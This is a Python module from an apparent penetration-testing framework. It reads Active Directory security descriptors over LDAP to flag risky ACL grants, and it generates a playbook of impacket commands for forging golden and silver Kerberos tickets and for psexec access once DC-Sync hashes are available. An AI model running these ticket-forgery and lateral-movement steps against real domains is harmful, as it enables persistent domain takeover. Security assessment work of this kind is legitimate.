"""VAJRA ad.power — the privileged-attack depth beyond hash dumping.

Read-only analysis + evidence-backed playbooks:
  - ACL risk surfacing: authenticates over LDAP, pulls raw
    nTSecurityDescriptor blobs and parses the self-relative DACL to flag
    high-risk access grants (WRITE_DAC / WRITE_OWNER / GENERIC_ALL /
    GENERIC_WRITE / DELETE / CONTROL_ACCESS) and dangerous trustee SIDs
    (Everyone / Anonymous / Domain & Authenticated Users). BloodHound-lite.
  - Golden / silver ticket forgery playbook: when NTDS hashes are already in
    state (from ad.privesc_ops DC-Sync), emits the exact ticketer/secretsdump
    command lines instead of inventing delegation.
  - Cross-forest trust jump notes from the discovered realm.

Everything is gated behind --aggressive; the module never writes to AD."""
import re

from core.database import Finding
from core.utils import which_tool

# -------- security descriptor / DACL parsing (self-relative) ------------

SE_DACL_PRESENT = 0x0004
SE_SELF_RELATIVE = 0x8000

ACE_TYPE = {0x00: "ALLOWED", 0x01: "DENIED", 0x02: "AUDIT",
            0x05: "ALLOWED-OBJECT", 0x06: "DENIED-OBJECT"}

# suspicious grants: anything that lets you overwrite the object
RISK_MASK = 0x00100000 | 0x00080000 | 0x00040000 | 0x00020000 | \
    0x00010000 | 0x01000000 | 0x02000000 | 0x00000001
# control_access | write_owner | write_dac | ... | delete | generic_all |
# generic_execute | generic_read | generic_write-ish catch via lower bits

RID_NAMES = {500: "Administrator", 501: "Guest", 502: "krbtgt",
             512: "Domain Admins", 513: "Domain Users", 514: "Domain Guests",
             515: "Domain Computers", 516: "Domain Controllers",
             517: "Cert Publishers", 518: "Schema Admins",
             519: "Enterprise Admins", 520: "Group Policy Creators",
             521: "Read-only DCs", 498: "Enterprise Read-only DCs"}

KNOWN_SIDS = {
    "S-1-1-0": "Everyone",
    "S-1-5-7": "Anonymous",
    "S-1-5-11": "Authenticated Users",
    "S-1-5-18": "Local System",
    "S-1-5-19": "Local Service",
    "S-1-5-20": "Network Service",
    "S-1-5-32-544": "BUILTIN\\Administrators",
    "S-1-5-32-545": "BUILTIN\\Users",
    "S-1-0-0": "Null SID (no access)",
}


def _sid_str(blob, off):
    """Canonical SID text: S-<rev>-<authority>-<subauth...> (e.g. S-1-5-7)."""
    if off + 8 > len(blob):
        return "?"
    sub_count = blob[off + 1] & 0x0F
    if len(blob) < off + 8 + sub_count * 4:
        return "?"
    authority = int.from_bytes(blob[off + 2:off + 8], "big")
    rids = [str(int.from_bytes(blob[off + 8 + 4 * i:off + 12 + 4 * i],
                               "little"))
            for i in range(sub_count)]
    return "S-%d-%d%s" % (blob[off], authority,
                          ("-" + "-".join(rids)) if rids else "")


def _sid_name(sid):
    if sid in KNOWN_SIDS:
        return KNOWN_SIDS[sid]
    m = re.match(r"^S-1-5-21-\d+-\d+-\d+-(\d+)$", sid)
    if m:
        rid = int(m.group(1))
        return RID_NAMES.get(rid, "Domain\\unknown-RID-%d" % rid)
    return sid


def parse_acl(data):
    """Parse a self-relative SECURITY_DESCRIPTOR. Returns a list of ACE
    dicts: {type, flags, mask, sid, name, risky}. Robust to truncation."""
    if not data or len(data) < 20:
        return []
    revision = data[0]
    control = int.from_bytes(data[2:4], "little")
    dacl_off = int.from_bytes(data[16:20], "little")
    ace_list = []
    if not (control & SE_DACL_PRESENT) or dacl_off <= 0:
        return ace_list
    acl = data[dacl_off:]
    if len(acl) < 8:
        return ace_list
    ace_count = int.from_bytes(acl[4:6], "little")
    off = 8
    for _ in range(ace_count):
        if off + 8 > len(acl):
            break
        atype = acl[off]
        flags = acl[off + 1]
        size = int.from_bytes(acl[off + 2:off + 4], "little")
        if size < 8 or off + size > len(acl):
            break
        mask = int.from_bytes(acl[off + 4:off + 8], "little")
        sid = _sid_str(acl, off + 8) if off + 8 + 8 <= len(acl) else "?"
        ace_list.append({
            "type": ACE_TYPE.get(atype & 0x0F, "?0x%02x" % atype),
            "flags": flags, "mask": mask,
            "sid": sid, "name": _sid_name(sid),
            "risky": bool(mask & RISK_MASK) and
                     (atype & 0x0F) == 0x00,
            "danger": _sid_name(sid) in
            ("Everyone", "Anonymous", "Authenticated Users",
             "Domain Users", "BUILTIN\\Users"),
        })
        off += size
    return ace_list


def _realm_name(engine):
    ad = engine.state.get("ad") or {}
    return ad.get("realm") or ad.get("domain") or ""


def _creds(engine):
    return getattr(engine, "ad_creds", {}) or {}


def _domain_base(realm):
    return ",".join("DC=" + part for part in realm.split("."))


def _acl_sweep(engine, host, realm):
    """Authenticated LDAP: pull nTSecurityDescriptor for high-value object
    classes and parse DACLs. Returns (findings_list, sample_lines)."""
    from modules.ad import ldap_enum as L
    creds = _creds(engine)
    user = creds.get("user", "")
    if not user:
        return [], []
    bind = L._bind_req(user, creds.get("password", ""))
    searches = [
        ("comps", "(objectCategory=computer)",
         ["sAMAccountName", "nTSecurityDescriptor"]),
        ("users", "(&(objectCategory=person)(objectClass=user))",
         ["sAMAccountName", "nTSecurityDescriptor"]),
        ("groups", "(objectCategory=group)",
         ["cn", "nTSecurityDescriptor"]),
    ]
    msgs = [bind] + [L._search_req(_domain_base(realm), f, a)
                     for _n, f, a in searches]
    try:
        responses = L._ldap_converse(host, 389, msgs, timeout=9)
    except Exception as e:
        return [], []
    br = L._bind_result(responses[0]) if responses and responses[0] else None
    if br != 0:
        return [], []
    risky = []
    samples = []
    for (_name, _f, attrs), raw in zip(searches, responses[1:]):
        if not raw:
            continue
        for blob in _extract_bin(raw, "nTSecurityDescriptor"):
            for ace in parse_acl(blob):
                if ace.get("risky") or (ace.get("danger") and
                                        ace["type"] == "ALLOWED"):
                    line = "%s %s mask=0x%08x %s" % (
                        ace["type"], ace["name"], ace["mask"], ace["sid"])
                    if line not in samples:
                        samples.append(line)
                    risky.append(ace)
    return risky, samples


def _extract_bin(raw, name):
    idx = 0
    name_b = name.encode()
    out = []
    while True:
        i = raw.find(name_b, idx)
        if i < 0:
            break
        j = i + len(name_b)
        if j + 1 < len(raw) and raw[j] == 0x04:
            ln = raw[j + 1]
            n = 0
            if ln & 0x80:
                n = ln & 0x7F
                if j + 1 + n + 1 > len(raw):
                    break
                ln = int.from_bytes(raw[j + 2:j + 2 + n], "big")
            start = j + 2 + n
            if ln >= 20 and start + ln <= len(raw):
                out.append(raw[start:start + ln])
        idx = j + 1
    return out


def _forge_playbook(engine, realm, ad):
    """Emit golden/silver forge + persistent-access command lines when NTDS
    material is available; otherwise, ready-to-run guidance."""
    hashes = []
    emot = engine.state.get("creds") or []
    for kind, h in emot:
        if "ntds" in kind or "ntlm" in kind:
            hashes.append(h)
    user = _creds(engine).get("user", "")
    lines = []
    if hashes:
        lines.append("NTDS material present in state. Forgery path "
                     "(run with impacket on the operator box):")
        lines.append("  ticketer -nthash <NTLM> -domain-sid <DOMAIN-SID> "
                     "-domain %s golden_admin" % realm)
        lines.append("  ticketer -nthash <NTLM> -domain-sid <DOMAIN-SID> "
                     "-spn cifs/dc.%s silver_cifs" % realm)
        lines.append("  export KRB5CCNAME=ticket.ccache; "
                     "psexec -k -no-pass -dc-ip <DC> domain-golden")
    else:
        lines.append("No NTDS hashes in state yet — run the DB/DC-Sync chain "
                     "(ad.privesc_ops) first, or pass a DC with admin creds.")
    lines.append("Trust-jump note: realm=%s — SIDHistoryFor:see "
                 "nTSecurityDescriptor trustPartner AD data." % realm)
    if user:
        lines.append("Authenticated so far as: %s (use delegated creds for "
                     "forest escalations beyond this realm)." % user)
    return hashes, lines


def run(engine):
    t = engine.target
    if not getattr(engine.args, "aggressive", False):
        engine.db.add_finding(Finding(
            t.display, "ad.power", "coverage", "info",
            "ad.power (ACL analysis + ticket-forgery playbook) gated",
            detail="Run with --aggressive and valid --ad-user/--ad-pass to "
                   "enable ACL-risk surfacing and forgery planning.",
            confidence="firm"))
        return
    ad = engine.state.get("ad") or {}
    host = t.scan_host()
    realm = _realm_name(engine)
    if not realm:
        engine.db.add_event(t.display, "ad.power",
                            "no realm discovered; LDAP/DC info needed")
        return
    engine.log.info("[ad.power] realm=%s — ACL sweep + forgery planning" %
                    realm)
    risky, samples = _acl_sweep(engine, host, realm)
    if risky:
        names = {}
        for a in risky:
            keys = (a["name"], a["mask"])
            names[keys] = names.get(keys, 0) + 1
        top = sorted(names.items(), key=lambda kv: -kv[1])[:5]
        engine.db.add_finding(Finding(
            t.display, "ad.power", "privilege-abuse", "high",
            "%d high-risk ACL grant(s) in the directory" % len(risky),
            detail="Authenticated LDAP DACL analysis flagged access "
                   "entries that allow overwriting objects (WRITE_DAC / "
                   "WRITE_OWNER / GENERIC_ALL / CONTROL_ACCESS) or grant "
                   "broad read/write to dangerous trustees.",
            evidence="\n".join(samples[:40]),
            remediation="Audit ACLs on sensitive directory objects; apply "
                        "least-privilege for service accounts and remove "
                        "Everyone/Anonymous grants.",
            confidence="firm"))
        engine.log.finding("[ad.power] %d risky ACL grants" % len(risky))
    elif risky is None:
        pass
    hashes, plan = _forge_playbook(engine, realm, ad)
    tag = "forgery-ready" if hashes else "posture-note"
    sev = "medium" if hashes else "low"
    engine.db.add_finding(Finding(
        t.display, "ad.power", tag, sev,
        "Domain persistence material available — golden/silver ready"
        if hashes else "Domain-forgery playbook documented",
        detail="\n".join(plan),
        evidence="present hashes: %d" % len(hashes) if hashes else
        "no NTDS material in state",
        remediation="Rotate krbtgt twice + authoritative replication when "
                    "compromise is confirmed; monitor TGT issuance.",
        confidence="firm" if hashes else "possible"))
    engine.state["ad_power"] = {"risky_aces": len(risky),
                                "forgery_ready": hashes}
    engine.log.finding("[ad.power] forgery material: %s" %
                       ("READY" if hashes else "absent"))
    engine.db.add_event(t.display, "ad.power", "analysis-complete")